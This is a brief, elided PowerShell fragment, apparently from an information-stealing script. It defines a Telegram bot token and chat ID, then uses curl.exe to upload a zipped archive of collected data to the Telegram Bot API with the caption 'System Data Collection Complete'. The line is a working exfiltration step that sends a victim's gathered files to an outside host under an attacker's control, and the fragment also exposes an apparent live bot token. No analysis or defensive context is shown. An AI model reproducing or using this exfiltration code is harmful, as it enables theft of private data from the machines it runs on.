...
$TelegramBotToken = "7442026925:AAHMoNtk_XagubdE96jkSt2V7mYcAZ1U-x8"
$ChatID = "5837648640"
...
curl.exe -X POST https://api.telegram.org/bot7442026925:AAHMoNtk_XagubdE96jkSt2V7mYcAZ1U-x8/sendDocument -F chat_id=5837648640 -F document=@"$ZipFile" -F caption="System Data Collection Complete"
